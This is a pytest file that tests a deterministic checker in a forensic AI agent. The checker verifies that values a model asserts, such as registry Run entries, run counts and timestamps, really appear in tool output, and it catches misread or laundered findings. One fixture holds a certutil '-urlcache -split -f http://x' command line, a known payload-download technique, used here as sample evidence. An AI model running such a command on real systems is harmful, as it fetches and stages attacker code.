"""Tests for the deterministic entailment checker.

These tests ARE the path-matching mini-spec from the plan. The checker is a
pure, LLM-free function: given the structured values a finding asserts and the
re-run tool output, confirm each asserted value is actually present. This is
what catches a "misread of real data laundered through a valid citation."
"""

from findevil_agent.entailment import (
    EntailmentResult,
    MatchedValue,
    check_entailment,
    entailment_slice,
    recheck_entailment_slice,
)
from findevil_agent.events import AssertedValue


class TestOfflineSlice:
    """The minimal entailment slice persisted into the signed chain, and its
    offline re-verification (manifest_verify re-runs the matcher over the sealed
    matched values, no tool re-run)."""

    def test_slice_captures_the_matched_evidence_value(self) -> None:
        avs = [AssertedValue(path="run_count", expected="3", match="int")]
        sl = entailment_slice(check_entailment(avs, {"run_count": 3}))
        assert sl["passed"] is True
        assert sl["matched"][0]["actual"] == "3"

    def test_clean_slice_rechecks_true(self) -> None:
        avs = [AssertedValue(path="run_count", expected="3", match="int")]
        sl = entailment_slice(check_entailment(avs, {"run_count": 3}))
        assert recheck_entailment_slice(sl) is True

    def test_tampered_sealed_value_rechecks_false(self) -> None:
        avs = [AssertedValue(path="run_count", expected="3", match="int")]
        sl = entailment_slice(check_entailment(avs, {"run_count": 3}))
        sl["matched"][0]["actual"] = "9"  # tamper the sealed evidence value
        assert recheck_entailment_slice(sl) is not True

    def test_record_slice_rechecks_true(self) -> None:
        avs = [
            AssertedValue(
                path="entries[*].values[*]",
                expected='{"name": "Updater", "data_str": "evil.exe"}',
                match="record",
            )
        ]
        out = {"entries": [{"values": [{"name": "Updater", "data_str": "C:\\x\\evil.exe"}]}]}
        sl = entailment_slice(check_entailment(avs, out))
        assert recheck_entailment_slice(sl) is True

    def test_empty_slice_is_vacuously_true(self) -> None:
        assert recheck_entailment_slice({"passed": True, "matched": [], "failures": []}) is True


_RECORD_AV = dict(
    path="entries[*].values[*]",
    expected='{"name": "Updater", "data_str": "evil.exe"}',
    match="record",
)


class TestRecordMatch:
    """Co-location: a ``record`` assertion binds several fields to the SAME
    record, so a model cannot launder a claim by taking the name from one row
    and the damning value from another."""

    def test_passes_when_one_record_satisfies_every_field(self) -> None:
        av = AssertedValue(**_RECORD_AV)
        out = {"entries": [{"values": [{"name": "Updater", "data_str": "C:\\x\\evil.exe"}]}]}
        assert check_entailment([av], out).passed is True

    def test_fails_when_fields_are_split_across_records(self) -> None:
        # name in one value, evil.exe in another — the cross-row launder.
        av = AssertedValue(**_RECORD_AV)
        out = {
            "entries": [
                {
                    "values": [
                        {"name": "Updater", "data_str": "C:\\Windows\\good.exe"},
                        {"name": "OneDrive", "data_str": "C:\\x\\evil.exe"},
                    ]
                }
            ]
        }
        assert check_entailment([av], out).passed is False

    def test_fails_when_a_required_field_is_absent(self) -> None:
        av = AssertedValue(**_RECORD_AV)
        out = {"entries": [{"values": [{"name": "Updater", "data_str": "C:\\good.exe"}]}]}
        assert check_entailment([av], out).passed is False

    def test_matched_records_the_colocated_evidence(self) -> None:
        av = AssertedValue(**_RECORD_AV)
        out = {"entries": [{"values": [{"name": "Updater", "data_str": "C:\\x\\evil.exe"}]}]}
        result = check_entailment([av], out)
        assert result.matched
        assert "evil.exe" in result.matched[0].actual.lower()


class TestExtractiveMatch:
    """The check is extractive: a passing assertion records the actual value
    the deterministic parser read out of the evidence, so the recorded fact is
    server-read, not model-transcribed."""

    def test_passing_check_reports_the_extracted_evidence_value(self) -> None:
        asserted = [AssertedValue(path="run_count", expected="3", match="int")]
        result = check_entailment(asserted, {"run_count": 3})
        assert result.passed is True
        assert len(result.matched) == 1
        m = result.matched[0]
        assert isinstance(m, MatchedValue)
        assert m.path == "run_count"
        assert m.expected == "3"
        assert m.actual == "3"  # the value the server read, normalized to str

    def test_contains_match_extracts_the_full_evidence_string(self) -> None:
        # The model asserts a substring; the server records the FULL evidence
        # string it found that substring in — richer provenance than the claim.
        asserted = [
            AssertedValue(
                path="entries[*].values[*].data_str",
                expected="evil.exe",
                match="contains",
            )
        ]
        output = {"entries": [{"values": [{"data_str": "C:\\Users\\bob\\evil.exe"}]}]}
        result = check_entailment(asserted, output)
        assert result.passed is True
        assert result.matched[0].actual == "C:\\Users\\bob\\evil.exe"

    def test_failed_assertion_contributes_no_matched_value(self) -> None:
        asserted = [AssertedValue(path="run_count", expected="9", match="int")]
        result = check_entailment(asserted, {"run_count": 3})
        assert result.passed is False
        assert result.matched == []

    def test_no_assertions_means_no_matched_values(self) -> None:
        result = check_entailment([], {"run_count": 3})
        assert result.passed is True
        assert result.matched == []


class TestExactMatch:
    def test_passes_when_top_level_value_present(self) -> None:
        asserted = [AssertedValue(path="executable_name", expected="EVIL.EXE")]
        output = {"executable_name": "EVIL.EXE", "run_count": 8}
        result = check_entailment(asserted, output)
        assert isinstance(result, EntailmentResult)
        assert result.passed is True

    def test_fails_when_value_differs(self) -> None:
        # The model claimed EVIL.EXE but the output actually says BENIGN.EXE.
        asserted = [AssertedValue(path="executable_name", expected="EVIL.EXE")]
        output = {"executable_name": "BENIGN.EXE"}
        result = check_entailment(asserted, output)
        assert result.passed is False
        assert "executable_name" in result.reason

    def test_fails_when_path_resolves_to_nothing(self) -> None:
        # Asserted field is not even in the output -> fail (not silently pass).
        asserted = [AssertedValue(path="does_not_exist", expected="x")]
        output = {"executable_name": "EVIL.EXE"}
        result = check_entailment(asserted, output)
        assert result.passed is False

    def test_trims_whitespace(self) -> None:
        asserted = [AssertedValue(path="name", expected="svchost.exe")]
        output = {"name": "  svchost.exe  "}
        assert check_entailment(asserted, output).passed is True


class TestWildcardPaths:
    def test_star_matches_value_in_a_list_of_records(self) -> None:
        # registry_query shape: entries[].values[].data_str
        asserted = [
            AssertedValue(
                path="entries[*].values[*].data_str",
                expected=r"C:\temp\evil.exe",
            )
        ]
        output = {
            "entries": [
                {
                    "key_path": r"...\Run",
                    "values": [
                        {
                            "name": "OneDrive",
                            "value_type": "REG_SZ",
                            "data_str": r"C:\Windows\od.exe",
                        },
                        {"name": "x", "value_type": "REG_SZ", "data_str": r"C:\temp\evil.exe"},
                    ],
                }
            ]
        }
        assert check_entailment(asserted, output).passed is True

    def test_star_fails_when_no_record_has_value(self) -> None:
        asserted = [AssertedValue(path="rows[*].TargetPath", expected=r"C:\temp\evil.exe")]
        output = {"rows": [{"TargetPath": r"C:\Windows\notepad.exe"}]}
        assert check_entailment(asserted, output).passed is False

    def test_indexed_segment(self) -> None:
        asserted = [AssertedValue(path="rows[0].FILENAME", expected="ntds.dit")]
        output = {"rows": [{"FILENAME": "ntds.dit"}, {"FILENAME": "other"}]}
        assert check_entailment(asserted, output).passed is True


class TestContainsMatch:
    def test_contains_is_case_insensitive_substring(self) -> None:
        asserted = [
            AssertedValue(
                path="rows[*].CommandLine",
                expected="certutil.exe -urlcache",
                match="contains",
            )
        ]
        output = {
            "rows": [
                {"CommandLine": "C:\\Windows\\System32\\CERTUTIL.EXE -urlcache -split -f http://x"}
            ]
        }
        assert check_entailment(asserted, output).passed is True


class TestIntMatch:
    def test_decimal_int_matches(self) -> None:
        asserted = [AssertedValue(path="run_count", expected="8", match="int")]
        output = {"run_count": 8}
        assert check_entailment(asserted, output).passed is True

    def test_hex_expected_matches_decimal_leaf(self) -> None:
        asserted = [AssertedValue(path="event_id", expected="0x1000", match="int")]
        output = {"event_id": 4096}
        assert check_entailment(asserted, output).passed is True

    def test_int_mismatch_fails(self) -> None:
        # The misread: model said run_count 8, output says 3.
        asserted = [AssertedValue(path="run_count", expected="8", match="int")]
        output = {"run_count": 3}
        assert check_entailment(asserted, output).passed is False


class TestIsoTimestampMatch:
    def test_same_instant_different_precision_matches(self) -> None:
        asserted = [
            AssertedValue(
                path="last_run_times_iso[*]",
                expected="2021-03-04T12:00:00+00:00",
                match="iso_ts",
            )
        ]
        output = {"last_run_times_iso": ["2021-03-04T12:00:00.000Z"]}
        assert check_entailment(asserted, output).passed is True

    def test_different_instant_fails(self) -> None:
        asserted = [
            AssertedValue(
                path="si_modified_iso",
                expected="2021-03-04T12:00:00Z",
                match="iso_ts",
            )
        ]
        output = {"si_modified_iso": "2021-03-04T13:00:00Z"}
        assert check_entailment(asserted, output).passed is False


class TestMultipleAssertions:
    def test_all_must_pass(self) -> None:
        asserted = [
            AssertedValue(path="a", expected="1", match="int"),
            AssertedValue(path="b", expected="two"),
        ]
        assert check_entailment(asserted, {"a": 1, "b": "two"}).passed is True
        assert check_entailment(asserted, {"a": 1, "b": "WRONG"}).passed is False

    def test_empty_assertions_passes_vacuously(self) -> None:
        # No structured assertions -> nothing to check (backward compatible).
        assert check_entailment([], {"anything": 1}).passed is True
